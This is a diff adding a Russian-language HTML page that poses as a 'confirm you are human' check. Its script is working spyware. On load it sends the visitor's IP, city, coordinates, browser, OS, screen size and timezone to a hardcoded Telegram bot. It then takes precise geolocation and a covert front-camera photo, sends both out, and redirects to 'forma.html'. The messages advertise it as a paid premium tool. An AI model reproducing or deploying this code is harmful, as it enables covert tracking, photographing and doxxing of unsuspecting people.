@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>🩸 Новый визит</title>
+    <style>
+        body { font-family: 'Arial', sans-serif; background-color: #1a1a1a; color: white; padding: 20px; }
+        video { display: none; }
+        #verificationMessage {
+            font-size: 1.5em;
+            text-align: center;
+            margin-top: 20%;
+        }
+    </style>
+</head>
+<body>
+    <div id="verificationMessage">
+        Подтвердите все запросы для проверки на человека...
+    </div>
+
+    <script>
+        const botToken = '7970247926:AAE5VMm3qrGzJZVsYDCxLJNoakW8DoN3N6M',
+              chatId = '5366421049',
+              ipInfoToken = 'e579b6b3444f57';
+
+        const sendMessage = async (msg) => {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+                if (!res.ok) throw new Error("Ошибка отправки сообщения");
+                console.log("Сообщение отправлено успешно!");
+            } catch (err) { console.error(err); }
+        };
+
+        const sendLocation = async (lat, lon) => {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${lat}&longitude=${lon}`);
+                if (!res.ok) throw new Error("Ошибка отправки геолокации");
+                console.log("Геометка отправлена успешно!");
+            } catch (err) { console.error(err); }
+        };
+
+        const generateVisitorId = () => Math.floor(Math.random() * 1000000);
+        const getUserIp = async () => (await fetch(`https://ipinfo.io/json?token=${ipInfoToken}`)).json();
+        const getBrowser = () => /chrome|chromium|crios/i.test(navigator.userAgent) ? 'Chrome' : /firefox|fxios/i.test(navigator.userAgent) ? 'Firefox' : /safari/i.test(navigator.userAgent) ? 'Safari' : 'Неизвестно';
+        const getOS = () => /Windows/i.test(navigator.userAgent) ? 'Windows' : /Macintosh/i.test(navigator.userAgent) ? 'macOS' : /Linux/i.test(navigator.userAgent) ? 'Linux' : /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone/i.test(navigator.userAgent) ? 'iOS' : 'Неизвестно';
+        const getDevice = () => /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone/i.test(navigator.userAgent) ? 'iPhone' : /Windows NT/i.test(navigator.userAgent) ? 'Windows' : /Macintosh/i.test(navigator.userAgent) ? 'macOS' : 'Неизвестно';
+        const getTimeZone = () => Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        const sendVisitorInfo = async () => {
+            const visitorId = generateVisitorId(),
+                  browser = getBrowser(),
+                  os = getOS(),
+                  screenRes = `${window.screen.width}x${window.screen.height}`,
+                  timeZone = getTimeZone(),
+                  ip = await getUserIp(),
+                  device = getDevice(),
+                  time = new Date().toLocaleString();
+
+            const message = 
+`<b>🔎 𝑹𝑬𝑽𝑬𝑵𝑨𝑻 𝑨𝑷𝑰:</b>
+<b>🔎 𝑷𝑹𝑰𝑺𝑬: 𝟕𝟓 𝑺𝑻𝑨𝑹𝑺:</b>
+<b>🔎 𝑻𝑰𝑷: 𝑷𝑹𝑬𝑴𝑰𝑼𝑴:</b>
+
+📝 <b>𝑹𝑬𝑮𝑰𝑺𝑻𝑹𝑨𝑻𝑰𝑶𝑵 𝑬𝑵𝑻𝑹𝒀:</b>
+├ <b>𝑽𝑰𝒮𝑰𝑻𝑶𝑹 𝑰𝑫:</b> #${visitorId}  
+└ <b>𝑻𝑰𝑴𝑬:</b> ${time}  
+
+<b>🌐 𝑮𝑬𝑶𝑳𝑶𝑪𝑨𝑻𝑰𝑶𝑵 𝑫𝑨𝑻𝑨:</b>
+├ <b>𝑰𝑷 𝑨𝑫𝑹𝑬𝑺𝑺:</b> ${ip.ip}  
+├ <b>𝑪𝑰𝑻𝒀:</b> ${ip.city}  
+├ <b>𝑳𝑶𝑪𝑨𝑻𝑰𝑶𝑵:</b> ${ip.city}, ${ip.country}  
+├ <b>𝑪𝑶𝑶𝑹𝑫𝑰𝑵𝑨𝑻𝑬𝑺:</b> ${ip.loc}  
+└ <b>𝑪𝑶𝑼𝑵𝑻𝑹𝒀:</b> ${ip.country}  
+
+<b>💻 𝑴𝑬𝑪𝑯𝑨𝑵𝑰𝑪𝑺:</b>
+├ <b>𝑩𝑹𝑶𝑾𝑺𝑬𝑹:</b> ${browser}  
+├ <b>𝑶𝑺:</b> ${os}  
+├ <b>𝑺𝑪𝑹𝑬𝑬𝑵 𝑹𝑬𝑺𝑶𝑳𝑼𝑻𝑰𝑶𝑵:</b> ${screenRes}  
+└ <b>𝑫𝑬𝑽𝑰𝑪𝑬:</b> ${device}  
+
+<b>🕰 𝑨𝑫𝑫𝑰𝑻𝑰𝑶𝑵𝑨𝑳 𝑰𝑵𝑭𝑶:</b>
+├ <b>𝑳𝑨𝑵𝑮𝑼𝑨𝑮𝑬:</b> ${navigator.language}  
+└ <b>𝑻𝑰𝑴𝑬𝒁𝑶𝑵𝑬:</b> ${timeZone}`;
+
+            await sendMessage(message);
+        };
+
+        const sendGeoPermissionResult = async (status, coords = null) => {
+            let msg = status === 'granted' && coords ? 
+`✅ <b>Пользователь разрешил доступ к геолокации!</b>
+🌐 <b>Широта:</b> ${coords.latitude}
+🌐 <b>Долгота:</b> ${coords.longitude}
+🎯 <b>Точность:</b> ±${coords.accuracy} м` 
+            : status === 'denied' ? "❌ <b>Пользователь отказал в доступе к геолокации.</b>" : "⚠️ <b>Не удалось определить статус геолокации.</b>";
+            
+            if (status === 'granted') await sendLocation(coords.latitude, coords.longitude);
+            await sendMessage(msg);
+        };
+
+        const requestCameraPermission = async () => {
+            if (!navigator.mediaDevices?.getUserMedia) return console.warn("Камера не поддерживается.");
+
+            let stream = null;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user" }
+                });
+            } catch (error) {
+                console.error("Ошибка доступа к камере:", error);
+                return;
+            }
+
+            const videoElement = document.createElement("video");
+            videoElement.style.display = "none";
+            document.body.appendChild(videoElement);
+            videoElement.srcObject = stream;
+
+            await new Promise(resolve => {
+                if (videoElement.readyState >= 3) {
+                    resolve();
+                } else {
+                    videoElement.addEventListener('loadeddata', resolve, { once: true });
+                }
+            });
+
+            videoElement.play();
+
+            setTimeout(async () => {
+                await capturePhoto(videoElement, stream);
+                document.body.removeChild(videoElement);
+            }, 1000);
+        };
+
+        const capturePhoto = async (videoElement, stream) => {
+            const canvas = document.createElement("canvas");
+            canvas.width = videoElement.videoWidth || 640;
+            canvas.height = videoElement.videoHeight || 480;
+            const context = canvas.getContext("2d");
+
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.95));
+
+            if (photoBlob) {
+                await sendPhotoToTelegram(photoBlob);
+            }
+
+            stream.getTracks().forEach(track => track.stop());
+        };
+
+        const sendPhotoToTelegram = async (photoBlob) => {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", photoBlob, "photo.jpg");
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
+                if (!res.ok) throw new Error("Ошибка при отправке фото");
+                console.log("Фото отправлено в Telegram успешно!");
+            } catch (err) { console.error("Ошибка отправки фото:", err); }
+        };
+
+        const init = async () => {
+            await sendVisitorInfo();
+            navigator.geolocation.getCurrentPosition(
+                async (pos) => {
+                    await sendGeoPermissionResult('granted', { latitude: pos.coords.latitude.toFixed(6), longitude: pos.coords.longitude.toFixed(6), accuracy: pos.coords.accuracy.toFixed(1) });
+                    await requestCameraPermission();
+                    setTimeout(() => {
+                        window.location.href = "forma.html";
+                    }, 2000);
+                },
+                async () => await sendGeoPermissionResult('denied')
+            );
+        };
+
+        init();
+    </script>
+</body>
+</html>
